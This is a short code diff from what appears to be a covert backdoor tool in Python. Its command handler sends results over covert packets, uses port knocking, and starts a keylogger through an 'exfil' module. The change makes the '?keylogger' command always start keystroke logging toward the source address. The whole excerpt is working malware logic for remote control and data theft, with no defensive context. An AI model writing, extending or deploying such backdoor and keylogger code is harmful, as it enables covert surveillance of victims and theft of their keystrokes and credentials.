@@ -83,10 +83,7 @@ def executeCommand(srcAddress, pacType, command):
 			send(utils.covertPacket(srcAddress, pacType, c, pswd), verbose=0)
 		knockCode(srcAddress, pacType, False)
 	elif "?keylogger" in command:
-		if not spyFunctions.logger:
-			exfil.startKeylogger(srcAddress, pacType)
-		else:
-			exfil.stopKeylogger()
+		exfil.startKeylogger(srcAddress, pacType)
 	else:
 		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 		sendThread.start()
